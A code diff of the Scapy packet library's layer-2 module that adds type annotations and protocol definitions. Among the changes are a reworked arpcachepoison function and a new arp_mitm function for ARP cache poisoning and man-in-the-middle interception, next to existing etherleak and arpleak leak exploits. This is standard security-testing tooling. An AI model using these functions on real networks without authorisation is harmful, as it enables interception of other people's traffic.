@@ -1,7 +1,7 @@
+# SPDX-License-Identifier: GPL-2.0-only
 # This file is part of Scapy
-# See http://www.secdev.org/projects/scapy for more information
+# See https://scapy.net/ for more information
 # Copyright (C) Philippe Biondi <phil@secdev.org>
-# This program is published under a GPLv2 license
 
 """
 Classes and functions for layer 2 protocols.
@@ -9,7 +9,6 @@ Classes and functions for layer 2 protocols.
 
 from __future__ import absolute_import
 from __future__ import print_function
-import os
 import struct
 import time
 import socket
@@ -21,27 +20,68 @@ from scapy.compat import chb, orb
 from scapy.config import conf
 from scapy import consts
 from scapy.data import ARPHDR_ETHER, ARPHDR_LOOPBACK, ARPHDR_METRICOM, \
-    DLT_ETHERNET_MPACKET, DLT_LINUX_IRDA, DLT_LINUX_SLL, DLT_LOOP, \
-    DLT_NULL, ETHER_ANY, ETHER_BROADCAST, ETHER_TYPES, ETH_P_ARP, \
+    DLT_ETHERNET_MPACKET, DLT_LINUX_IRDA, DLT_LINUX_SLL, DLT_LINUX_SLL2, \
+    DLT_LOOP, DLT_NULL, ETHER_ANY, ETHER_BROADCAST, ETHER_TYPES, ETH_P_ARP, \
     ETH_P_MACSEC
-from scapy.error import warning, ScapyNoDstMacException
-from scapy.fields import BCDFloatField, BitField, ByteField, \
-    ConditionalField, FieldLenField, FCSField, \
-    IntEnumField, IntField, IP6Field, IPField, \
-    LenField, MACField, MultipleTypeField, \
-    ShortEnumField, ShortField, SourceIP6Field, SourceIPField, \
-    StrFixedLenField, StrLenField, X3BytesField, XByteField, XIntField, \
-    XShortEnumField, XShortField
-from scapy.modules.six import viewitems
+from scapy.error import warning, ScapyNoDstMacException, log_runtime
+from scapy.fields import (
+    BCDFloatField,
+    BitField,
+    ByteEnumField,
+    ByteField,
+    ConditionalField,
+    FCSField,
+    FieldLenField,
+    IP6Field,
+    IPField,
+    IntEnumField,
+    IntField,
+    LenField,
+    MACField,
+    MultipleTypeField,
+    OUIField,
+    ShortEnumField,
+    ShortField,
+    SourceIP6Field,
+    SourceIPField,
+    StrFixedLenField,
+    StrLenField,
+    XByteField,
+    XIntField,
+    XShortEnumField,
+    XShortField,
+)
+from scapy.interfaces import _GlobInterfaceType
+from scapy.libs.six import viewitems
 from scapy.packet import bind_layers, Packet
-from scapy.plist import PacketList, SndRcvList
-from scapy.sendrecv import sendp, srp, srp1
+from scapy.plist import (
+    PacketList,
+    QueryAnswer,
+    SndRcvList,
+    _PacketList,
+)
+from scapy.sendrecv import sendp, srp, srp1, srploop
 from scapy.utils import checksum, hexdump, hexstr, inet_ntoa, inet_aton, \
     mac2str, valid_mac, valid_net, valid_net6
+from scapy.compat import (
+    Any,
+    Callable,
+    Dict,
+    List,
+    Optional,
+    Tuple,
+    Type,
+    Union,
+    cast,
+)
+from scapy.interfaces import NetworkInterface
 if conf.route is None:
     # unused import, only to initialize conf.route
     import scapy.route  # noqa: F401
 
+
+# type definitions
+_ResolverCallable = Callable[[Packet, Packet], Optional[str]]
 
 #################
 #  Tools        #
@@ -50,27 +90,34 @@ if conf.route is None:
 
 class Neighbor:
     def __init__(self):
-        self.resolvers = {}
+        # type: () -> None
+        self.resolvers = {}  # type: Dict[Tuple[Type[Packet], Type[Packet]], _ResolverCallable] # noqa: E501
 
     def register_l3(self, l2, l3, resolve_method):
+        # type: (Type[Packet], Type[Packet], _ResolverCallable) -> None
         self.resolvers[l2, l3] = resolve_method
 
     def resolve(self, l2inst, l3inst):
+        # type: (Ether, Packet) -> Optional[str]
         k = l2inst.__class__, l3inst.__class__
         if k in self.resolvers:
             return self.resolvers[k](l2inst, l3inst)
+        return None
 
     def __repr__(self):
+        # type: () -> str
         return "\n".join("%-15s -> %-15s" % (l2.__name__, l3.__name__) for l2, l3 in self.resolvers)  # noqa: E501
 
 
 conf.neighbor = Neighbor()
 
-conf.netcache.new_cache("arp_cache", 120)  # cache entries expire after 120s
+# cache entries expire after 120s
+_arp_cache = conf.netcache.new_cache("arp_cache", 120)
 
 
 @conf.commands.register
 def getmacbyip(ip, chainCC=0):
+    # type: (str, int) -> Optional[str]
     """Return MAC address corresponding to a given IP address"""
     if isinstance(ip, Net):
         ip = next(iter(ip))
@@ -84,7 +131,7 @@ def getmacbyip(ip, chainCC=0):
     if gw != "0.0.0.0":
         ip = gw
 
-    mac = conf.netcache.arp_cache.get(ip)
+    mac = _arp_cache.get(ip)
     if mac:
         return mac
 
@@ -97,11 +144,11 @@ def getmacbyip(ip, chainCC=0):
                    chainCC=chainCC,
                    nofilter=1)
     except Exception as ex:
-        warning("getmacbyip failed on %s" % ex)
+        warning("getmacbyip failed on %s", ex)
         return None
     if res is not None:
         mac = res.payload.hwsrc
-        conf.netcache.arp_cache[ip] = mac
+        _arp_cache[ip] = mac
         return mac
     return None
 
@@ -110,10 +157,12 @@ def getmacbyip(ip, chainCC=0):
 
 class DestMACField(MACField):
     def __init__(self, name):
+        # type: (str) -> None
         MACField.__init__(self, name, None)
 
     def i2h(self, pkt, x):
-        if x is None:
+        # type: (Optional[Ether], Optional[str]) -> str
+        if x is None and pkt is not None:
             try:
                 x = conf.neighbor.resolve(pkt, pkt.payload)
             except socket.error:
@@ -124,9 +173,10 @@ class DestMACField(MACField):
                 else:
                     x = "ff:ff:ff:ff:ff:ff"
                     warning("Mac address to reach destination not found. Using broadcast.")  # noqa: E501
-        return MACField.i2h(self, pkt, x)
+        return super(DestMACField, self).i2h(pkt, x)
 
     def i2m(self, pkt, x):
+        # type: (Optional[Ether], Optional[str]) -> bytes
         return MACField.i2m(self, pkt, self.i2h(pkt, x))
 
 
@@ -134,10 +184,12 @@ class SourceMACField(MACField):
     __slots__ = ["getif"]
 
     def __init__(self, name, getif=None):
+        # type: (str, Optional[Any]) -> None
         MACField.__init__(self, name, None)
         self.getif = (lambda pkt: pkt.route()[0]) if getif is None else getif
 
     def i2h(self, pkt, x):
+        # type: (Optional[Packet], Optional[str]) -> str
         if x is None:
             iff = self.getif(pkt)
             if iff is None:
@@ -149,13 +201,38 @@ class SourceMACField(MACField):
                     warning("Could not get the source MAC: %s" % e)
             if x is None:
                 x = "00:00:00:00:00:00"
-        return MACField.i2h(self, pkt, x)
+        return super(SourceMACField, self).i2h(pkt, x)
 
     def i2m(self, pkt, x):
+        # type: (Optional[Ether], Optional[Any]) -> bytes
         return MACField.i2m(self, pkt, self.i2h(pkt, x))
 
 
 # Layers
+
+HARDWARE_TYPES = {
+    1: "Ethernet (10Mb)",
+    2: "Ethernet (3Mb)",
+    3: "AX.25",
+    4: "Proteon ProNET Token Ring",
+    5: "Chaos",
+    6: "IEEE 802 Networks",
+    7: "ARCNET",
+    8: "Hyperchannel",
+    9: "Lanstar",
+    10: "Autonet Short Address",
+    11: "LocalTalk",
+    12: "LocalNet",
+    13: "Ultra link",
+    14: "SMDS",
+    15: "Frame relay",
+    16: "ATM",
+    17: "HDLC",
+    18: "Fibre Channel",
+    19: "ATM",
+    20: "Serial Line",
+    21: "ATM",
+}
 
 ETHER_TYPES[0x88a8] = '802_AD'
 ETHER_TYPES[ETH_P_MACSEC] = '802_1AE'
@@ -169,19 +246,23 @@ class Ether(Packet):
     __slots__ = ["_defrag_pos"]
 
     def hashret(self):
+        # type: () -> bytes
         return struct.pack("H", self.type) + self.payload.hashret()
 
     def answers(self, other):
+        # type: (Packet) -> int
         if isinstance(other, Ether):
             if self.type == other.type:
                 return self.payload.answers(other.payload)
         return 0
 
     def mysummary(self):
+        # type: () -> str
         return self.sprintf("%src% > %dst% (%type%)")
 
     @classmethod
     def dispatch_hook(cls, _pkt=None, *args, **kargs):
+        # type: (Optional[bytes], *Any, **Any) -> Type[Packet]
         if _pkt and len(_pkt) >= 14:
             if struct.unpack("!H", _pkt[12:14])[0] <= 1500:
                 return Dot3
@@ -195,19 +276,23 @@ class Dot3(Packet):
                    LenField("len", None, "H")]
 
     def extract_padding(self, s):
+        # type: (bytes) -> Tuple[bytes, bytes]
         tmp_len = self.len
         return s[:tmp_len], s[tmp_len:]
 
     def answers(self, other):
+        # type: (Ether) -> int
         if isinstance(other, Dot3):
             return self.payload.answers(other.payload)
         return 0
 
     def mysummary(self):
+        # type: () -> str
         return "802.3 %s > %s" % (self.src, self.dst)
 
     @classmethod
     def dispatch_hook(cls, _pkt=None, *args, **kargs):
+        # type: (Optional[Any], *Any, **Any) -> Type[Packet]
         if _pkt and len(_pkt) >= 14:
             if struct.unpack("!H", _pkt[12:14])[0] > 1500:
                 return Ether
@@ -222,26 +307,45 @@ class LLC(Packet):
 
 
 def l2_register_l3(l2, l3):
-    return conf.neighbor.resolve(l2, l3.payload)
+    # type: (Packet, Packet) -> Optional[str]
+    neighbor = conf.neighbor  # type: Neighbor
+    return neighbor.resolve(l2, l3.payload)
 
 
 conf.neighbor.register_l3(Ether, LLC, l2_register_l3)
 conf.neighbor.register_l3(Dot3, LLC, l2_register_l3)
 
 
+COOKED_LINUX_PACKET_TYPES = {
+    0: "unicast",
+    1: "broadcast",
+    2: "multicast",
+    3: "unicast-to-another-host",
+    4: "sent-by-us"
+}
+
+
 class CookedLinux(Packet):
     # Documentation: http://www.tcpdump.org/linktypes/LINKTYPE_LINUX_SLL.html
     name = "cooked linux"
     # from wireshark's database
-    fields_desc = [ShortEnumField("pkttype", 0, {0: "unicast",
-                                                 1: "broadcast",
-                                                 2: "multicast",
-                                                 3: "unicast-to-another-host",
-                                                 4: "sent-by-us"}),
+    fields_desc = [ShortEnumField("pkttype", 0, COOKED_LINUX_PACKET_TYPES),
                    XShortField("lladdrtype", 512),
                    ShortField("lladdrlen", 0),
-                   StrFixedLenField("src", "", 8),
+                   StrFixedLenField("src", b"", 8),
                    XShortEnumField("proto", 0x800, ETHER_TYPES)]
+
+
+class CookedLinuxV2(CookedLinux):
+    # Documentation: https://www.tcpdump.org/linktypes/LINKTYPE_LINUX_SLL2.html
+    name = "cooked linux v2"
+    fields_desc = [XShortEnumField("proto", 0x800, ETHER_TYPES),
+                   ShortField("reserved", 0),
+                   IntField("ifindex", 0),
+                   XShortField("lladdrtype", 512),
+                   ByteEnumField("pkttype", 0, COOKED_LINUX_PACKET_TYPES),
+                   ByteField("lladdrlen", 0),
+                   StrFixedLenField("src", b"", 8)]
 
 
 class MPacketPreamble(Packet):
@@ -253,7 +357,7 @@ class MPacketPreamble(Packet):
 
 class SNAP(Packet):
     name = "SNAP"
-    fields_desc = [X3BytesField("OUI", 0x000000),
+    fields_desc = [OUIField("OUI", 0x000000),
                    XShortEnumField("code", 0x000, ETHER_TYPES)]
 
 
@@ -269,6 +373,7 @@ class Dot1Q(Packet):
                    XShortEnumField("type", 0x0000, ETHER_TYPES)]
 
     def answers(self, other):
+        # type: (Packet) -> int
         if isinstance(other, Dot1Q):
             if ((self.type == other.type) and
                     (self.vlan == other.vlan)):
@@ -278,16 +383,19 @@ class Dot1Q(Packet):
         return 0
 
     def default_payload_class(self, pay):
+        # type: (bytes) -> Type[Packet]
         if self.type <= 1500:
             return LLC
         return conf.raw_layer
 
     def extract_padding(self, s):
+        # type: (bytes) -> Tuple[bytes, Optional[bytes]]
         if self.type <= 1500:
             return s[:self.type], s[self.type:]
         return s, None
 
     def mysummary(self):
+        # type: () -> str
         if isinstance(self.underlayer, Ether):
             return self.underlayer.sprintf("802.1q %Ether.src% > %Ether.dst% (%Dot1Q.type%) vlan %Dot1Q.vlan%")  # noqa: E501
         else:
@@ -318,7 +426,7 @@ class STP(Packet):
 class ARP(Packet):
     name = "ARP"
     fields_desc = [
-        XShortField("hwtype", 0x0001),
+        XShortEnumField("hwtype", 0x0001, HARDWARE_TYPES),
         XShortEnumField("ptype", 0x0800, ETHER_TYPES),
         FieldLenField("hwlen", None, fmt="B", length_of="hwsrc"),
         FieldLenField("plen", None, fmt="B", length_of="psrc"),
@@ -394,36 +502,43 @@ class ARP(Packet):
     ]
 
     def hashret(self):
+        # type: () -> bytes
         return struct.pack(">HHH", self.hwtype, self.ptype,
                            ((self.op + 1) // 2)) + self.payload.hashret()
 
     def answers(self, other):
+        # type: (Packet) -> int
         if not isinstance(other, ARP):
             return False
         if self.op != other.op + 1:
             return False
         # We use a loose comparison on psrc vs pdst to catch answers
         # with ARP leaks
-        self_psrc = self.get_field('psrc').i2m(self, self.psrc)
-        other_pdst = other.get_field('pdst').i2m(other, other.pdst)
+        self_psrc = self.get_field('psrc').i2m(self, self.psrc)  # type: bytes
+        other_pdst = other.get_field('pdst').i2m(other, other.pdst) \
+            # type: bytes
         return self_psrc[:len(other_pdst)] == other_pdst[:len(self_psrc)]
 
     def route(self):
-        fld, dst = self.getfield_and_val("pdst")
-        fld, dst = fld._find_fld_pkt_val(self, dst)
+        # type: () -> Tuple[Optional[str], Optional[str], Optional[str]]
+        fld, dst = cast(Tuple[MultipleTypeField, str],
+                        self.getfield_and_val("pdst"))
+        fld_inner, dst = fld._find_fld_pkt_val(self, dst)
         if isinstance(dst, Gen):
             dst = next(iter(dst))
-        if isinstance(fld, IP6Field):
+        if isinstance(fld_inner, IP6Field):
             return conf.route6.route(dst)
-        elif isinstance(fld, IPField):
+        elif isinstance(fld_inner, IPField):
             return conf.route.route(dst)
         else:
             return None, None, None
 
     def extract_padding(self, s):
-        return "", s
+        # type: (bytes) -> Tuple[bytes, bytes]
+        return b"", s
 
     def mysummary(self):
+        # type: () -> str
         if self.op == 1:
             return self.sprintf("ARP who has %pdst% says %psrc%")
         if self.op == 2:
@@ -432,7 +547,16 @@ class ARP(Packet):
 
 
 def l2_register_l3_arp(l2, l3):
-    return getmacbyip(l3.pdst)
+    # type: (Packet, Packet) -> Optional[str]
+    # TODO: support IPv6?
+    plen = l3.plen if l3.plen is not None else l3.get_field("pdst").i2len(l3, l3.pdst)
+    if plen == 4:
+        return getmacbyip(l3.pdst)
+    log_runtime.warning(
+        "Unable to guess L2 MAC address from an ARP packet with a "
+        "non-IPv4 pdst. Provide it manually !"
+    )
+    return None
 
 
 conf.neighbor.register_l3(Ether, ARP, l2_register_l3_arp)
@@ -443,7 +567,8 @@ class GRErouting(Packet):
     fields_desc = [ShortField("address_family", 0),
                    ByteField("SRE_offset", 0),
                    FieldLenField("SRE_len", None, "routing_info", "B"),
-                   StrLenField("routing_info", "", "SRE_len"),
+                   StrLenField("routing_info", b"",
+                               length_from=lambda pkt: pkt.SRE_len),
                    ]
 
 
@@ -469,11 +594,13 @@ class GRE(Packet):
 
     @classmethod
     def dispatch_hook(cls, _pkt=None, *args, **kargs):
+        # type: (Optional[Any], *Any, **Any) -> Type[Packet]
         if _pkt and struct.unpack("!H", _pkt[2:4])[0] == 0x880b:
             return GRE_PPTP
         return cls
 
     def post_build(self, p, pay):
+        # type: (bytes, bytes) -> bytes
         p += pay
         if self.chksum_present and self.chksum is None:
             c = checksum(p)
@@ -508,6 +635,7 @@ class GRE_PPTP(GRE):
                    ConditionalField(XIntField("ack_number", None), lambda pkt: pkt.acknum_present == 1)]  # noqa: E501
 
     def post_build(self, p, pay):
+        # type: (bytes, bytes) -> bytes
         p += pay
         if self.payload_len is None:
             pay_len = len(pay)
@@ -520,10 +648,12 @@ class GRE_PPTP(GRE):
 class LoIntEnumField(IntEnumField):
 
     def m2i(self, pkt, x):
+        # type: (Optional[Packet], int) -> int
         return x >> 24
 
     def i2m(self, pkt, x):
-        return x << 24
+        # type: (Optional[Packet], Union[List[int], int, None]) -> int
+        return cast(int, x) << 24
 
 
 # https://github.com/wireshark/wireshark/blob/fe219637a6748130266a0b0278166046e60a2d68/epan/dissectors/packet-null.c
@@ -587,6 +717,7 @@ conf.l2types.register_num2layer(ARPHDR_METRICOM, Ether)
 conf.l2types.register_num2layer(ARPHDR_LOOPBACK, Ether)
 conf.l2types.register_layer2num(ARPHDR_ETHER, Dot3)
 conf.l2types.register(DLT_LINUX_SLL, CookedLinux)
+conf.l2types.register(DLT_LINUX_SLL2, CookedLinuxV2)
 conf.l2types.register(DLT_ETHERNET_MPACKET, MPacketPreamble)
 conf.l2types.register_num2layer(DLT_LINUX_IRDA, CookedLinux)
 conf.l2types.register(DLT_LOOP, Loopback)
@@ -599,27 +730,138 @@ conf.l3types.register(ETH_P_ARP, ARP)
 
 
 @conf.commands.register
-def arpcachepoison(target, victim, interval=60):
-    """Poison target's cache with (your MAC,victim's IP) couple
-arpcachepoison(target, victim, [interval=60]) -> None
-"""
-    tmac = getmacbyip(target)
-    p = Ether(dst=tmac) / ARP(op="who-has", psrc=victim, pdst=target)
+def arpcachepoison(
+    target,  # type: Union[str, List[str]]
+    addresses,  # type: Union[str, Tuple[str, str], List[Tuple[str, str]]]
+    interval=15,  # type: int
+):
+    # type: (...) -> None
+    """Poison targets' ARP cache
+
+    :param target: Can be an IP, subnet (string) or a list of IPs. This lists the IPs
+                   or subnets that will be poisoned.
+    :param addresses: Can be either a string, a tuple of a list of tuples.
+                      If it's a string, it's the IP to usurpate in the victim,
+                      with the local interface's MAC. If it's a tuple,
+                      it's ("IP", "MAC"). It it's a list, it's [("IP", "MAC")]
+
+    Examples for target "192.168.0.2"::
+
+        >>> arpcachepoison("192.168.0.2", "192.168.0.1")
+        >>> arpcachepoison("192.168.0.1/24", "192.168.0.1")
+        >>> arpcachepoison(["192.168.0.2", "192.168.0.3"], "192.168.0.1")
+        >>> arpcachepoison("192.168.0.2", ("192.168.0.1", get_if_hwaddr("virbr0")))
+        >>> arpcachepoison("192.168.0.2", [("192.168.0.1", get_if_hwaddr("virbr0"),
+        ...                                ("192.168.0.2", "aa:aa:aa:aa:aa:aa")])
+
+    """
+    if isinstance(target, str):
+        targets = Net(target)  # type: Union[Net, List[str]]
+        str_target = target
+    else:
+        targets = target
+        str_target = target[0]
+    if isinstance(addresses, str):
+        couple_list = [(addresses, get_if_hwaddr(conf.route.route(str_target)[0]))]
+    elif isinstance(addresses, tuple):
+        couple_list = [addresses]
+    else:
+        couple_list = addresses
+    p = [
+        Ether(src=y) / ARP(op="who-has", psrc=x, pdst=targets,
+                           hwsrc=y, hwdst="ff:ff:ff:ff:ff:ff")
+        for x, y in couple_list
+    ]
     try:
         while True:
-            sendp(p, iface_hint=target)
-            if conf.verb > 1:
-                os.write(1, b".")
+            sendp(p, iface_hint=str_target)
             time.sleep(interval)
     except KeyboardInterrupt:
         pass
 
 
+@conf.commands.register
+def arp_mitm(
+    ip1,  # type: str
+    ip2,  # type: str
+    mac1=None,  # type: Optional[str]
+    mac2=None,  # type: Optional[str]
+    target_mac=None,  # type: Optional[str]
+    iface=None,  # type: Optional[_GlobInterfaceType]
+    inter=3,  # type: int
+):
+    # type: (...) -> None
+    """ARP MitM: poison 2 target's ARP cache
+
+    :param ip1: IPv4 of the first machine
+    :param ip2: IPv4 of the second machine
+    :param mac1: MAC of the first machine (optional: will ARP otherwise)
+    :param mac2: MAC of the second machine (optional: will ARP otherwise)
+    :param target_mac: MAC of the attacker (optional: default to the interface's one)
+    :param iface: the network interface. (optional: default, route for ip1)
+
+    Example usage::
+
+        $ sysctl net.ipv4.conf.virbr0.send_redirects=0  # virbr0 = interface
+        $ sysctl net.ipv4.ip_forward=1
+        $ sudo scapy
+        >>> arp_mitm("192.168.122.156", "192.168.122.17")
+
+    Remember to change the sysctl settings back..
+    """
+    if not iface:
+        iface = conf.route.route(ip1)[0]
+    if not target_mac:
+        target_mac = get_if_hwaddr(iface)
+    if mac1 is None:
+        mac1 = getmacbyip(ip1)
+        if not mac1:
+            print("Can't resolve mac for %s" % ip1)
+            return
+    if mac2 is None:
+        mac2 = getmacbyip(ip2)
+        if not mac2:
+            print("Can't resolve mac for %s" % ip2)
+            return
+    print("MITM on %s: %s <--> %s <--> %s" % (iface, mac1, target_mac, mac2))
+    # We loop who-has requests
+    srploop(
+        [
+            Ether(dst=mac1, src=target_mac) /
+            ARP(op="who-has", psrc=ip2, pdst=ip1,
+                hwsrc=target_mac, hwdst="ff:ff:ff:ff:ff:ff"),
+            Ether(dst=mac2, src=target_mac) /
+            ARP(op="who-has", psrc=ip1, pdst=ip2,
+                hwsrc=target_mac, hwdst="ff:ff:ff:ff:ff:ff")
+        ],
+        filter="arp and arp[7] = 2",
+        inter=inter,
+        iface=iface,
+        timeout=0.5,
+        verbose=1,
+        store=0,
+    )
+    print("Restoring...")
+    sendp([
+        Ether(dst=mac1, src=target_mac) /
+        ARP(op="who-has", psrc=ip2, pdst=ip1,
+            hwsrc=mac2, hwdst="ff:ff:ff:ff:ff:ff"),
+        Ether(dst=mac2, src=target_mac) /
+        ARP(op="who-has", psrc=ip1, pdst=ip2,
+            hwsrc=mac1, hwdst="ff:ff:ff:ff:ff:ff")
+    ], iface=iface)
+
+
 class ARPingResult(SndRcvList):
-    def __init__(self, res=None, name="ARPing", stats=None):
+    def __init__(self,
+                 res=None,  # type: Optional[Union[_PacketList[QueryAnswer], List[QueryAnswer]]]  # noqa: E501
+                 name="ARPing",  # type: str
+                 stats=None  # type: Optional[List[Type[Packet]]]
+                 ):
         SndRcvList.__init__(self, res, name, stats)
 
-    def show(self):
+    def show(self, *args, **kwargs):
+        # type: (*Any, **Any) -> None
         """
         Print the list of discovered MAC addresses.
         """
@@ -639,18 +881,25 @@ class ARPingResult(SndRcvList):
 
 @conf.commands.register
 def arping(net, timeout=2, cache=0, verbose=None, **kargs):
+    # type: (str, int, int, Optional[int], **Any) -> Tuple[ARPingResult, PacketList] # noqa: E501
     """Send ARP who-has requests to determine which hosts are up
 arping(net, [cache=0,] [iface=conf.iface,] [verbose=conf.verb]) -> None
 Set cache=True if you want arping to modify internal ARP-Cache"""
     if verbose is None:
         verbose = conf.verb
-    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=net), verbose=verbose,  # noqa: E501
-                     filter="arp and arp[7] = 2", timeout=timeout, iface_hint=net, **kargs)  # noqa: E501
+    ans, unans = srp(
+        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=net),
+        verbose=verbose,
+        filter="arp and arp[7] = 2",
+        timeout=timeout,
+        iface_hint=net,
+        **kargs
+    )
     ans = ARPingResult(ans.res)
 
     if cache and ans is not None:
         for pair in ans:
-            conf.netcache.arp_cache[pair[1].psrc] = (pair[1].hwsrc, time.time())  # noqa: E501
+            _arp_cache[pair[1].psrc] = pair[1].hwsrc
     if ans is not None and verbose:
         ans.show()
     return ans, unans
@@ -658,6 +907,7 @@ Set cache=True if you want arping to modify internal ARP-Cache"""
 
 @conf.commands.register
 def is_promisc(ip, fake_bcast="ff:ff:00:00:00:00", **kargs):
+    # type: (str, str, **Any) -> bool
     """Try to guess if target is in Promisc mode. The target is provided by its ip."""  # noqa: E501
 
     responses = srp1(Ether(dst=fake_bcast) / ARP(op="who-has", pdst=ip), type=ETH_P_ARP, iface_hint=ip, timeout=1, verbose=0, **kargs)  # noqa: E501
@@ -667,6 +917,7 @@ def is_promisc(ip, fake_bcast="ff:ff:00:00:00:00", **kargs):
 
 @conf.commands.register
 def promiscping(net, timeout=2, fake_bcast="ff:ff:ff:ff:ff:fe", **kargs):
+    # type: (str, int, str, **Any) -> Tuple[ARPingResult, PacketList]
     """Send ARP who-has requests to determine which hosts are in promiscuous mode
     promiscping(net, iface=conf.iface)"""
     ans, unans = srp(Ether(dst=fake_bcast) / ARP(pdst=net),
@@ -677,7 +928,7 @@ def promiscping(net, timeout=2, fake_bcast="ff:ff:ff:ff:ff:fe", **kargs):
     return ans, unans
 
 
-class ARP_am(AnsweringMachine):
+class ARP_am(AnsweringMachine[Packet]):
     """Fake ARP Relay Daemon (farpd)
 
     example:
@@ -708,21 +959,36 @@ class ARP_am(AnsweringMachine):
     filter = "arp"
     send_function = staticmethod(sendp)
 
-    def parse_options(self, IP_addr=None, ARP_addr=None):
-        self.IP_addr = IP_addr
+    def parse_options(self, IP_addr=None, ARP_addr=None, from_ip=None):
+        # type: (Optional[str], Optional[str], Optional[str]) -> None
+        if isinstance(IP_addr, str):
+            self.IP_addr = Net(IP_addr)  # type: Optional[Net]
+        else:
+            self.IP_addr = IP_addr
+        if isinstance(from_ip, str):
+            self.from_ip = Net(from_ip)  # type: Optional[Net]
+        else:
+            self.from_ip = from_ip
         self.ARP_addr = ARP_addr
 
     def is_request(self, req):
-        return (req.haslayer(ARP) and
-                req.getlayer(ARP).op == 1 and
-                (self.IP_addr is None or self.IP_addr == req.getlayer(ARP).pdst))  # noqa: E501
+        # type: (Ether) -> bool
+        if not req.haslayer(ARP):
+            return False
+        arp = req[ARP]
+        return (
+            arp.op == 1 and
+            (self.IP_addr is None or arp.pdst in self.IP_addr) and
+            (self.from_ip is None or arp.psrc in self.from_ip)
+        )
 
     def make_reply(self, req):
-        ether = req.getlayer(Ether)
-        arp = req.getlayer(ARP)
+        # type: (Packet) -> Packet
+        ether = req[Ether]
+        arp = req[ARP]
 
         if 'iface' in self.optsend:
-            iff = self.optsend.get('iface')
+            iff = cast(Union[NetworkInterface, str], self.optsend.get('iface'))
         else:
             iff, a, gw = conf.route.route(arp.psrc)
         self.iff = iff
@@ -741,18 +1007,21 @@ class ARP_am(AnsweringMachine):
                                          pdst=arp.psrc)
         return resp
 
-    def send_reply(self, reply):
+    def send_reply(self, reply, send_function=None):
+        # type: (Packet, Any) -> None
         if 'iface' in self.optsend:
             self.send_function(reply, **self.optsend)
         else:
             self.send_function(reply, iface=self.iff, **self.optsend)
 
     def print_reply(self, req, reply):
+        # type: (Packet, Packet) -> None
         print("%s ==> %s on %s" % (req.summary(), reply.summary(), self.iff))
 
 
 @conf.commands.register
 def etherleak(target, **kargs):
+    # type: (str, **Any) -> Tuple[SndRcvList, PacketList]
     """Exploit Etherleak flaw"""
     return srp(Ether() / ARP(pdst=target),
                prn=lambda s_r: conf.padding_layer in s_r[1] and hexstr(s_r[1][conf.padding_layer].load),  # noqa: E501
@@ -761,13 +1030,14 @@ def etherleak(target, **kargs):
 
 @conf.commands.register
 def arpleak(target, plen=255, hwlen=255, **kargs):
+    # type: (str, int, int, **Any) -> Tuple[SndRcvList, PacketList]
     """Exploit ARP leak flaws, like NetBSD-SA2017-002.
 
 https://ftp.netbsd.org/pub/NetBSD/security/advisories/NetBSD-SA2017-002.txt.asc
 
     """
     # We want explicit packets
-    pkts_iface = {}
+    pkts_iface = {}  # type: Dict[str, List[Ether]]
     for pkt in ARP(pdst=target):
         # We have to do some of Scapy's work since we mess with
         # important values
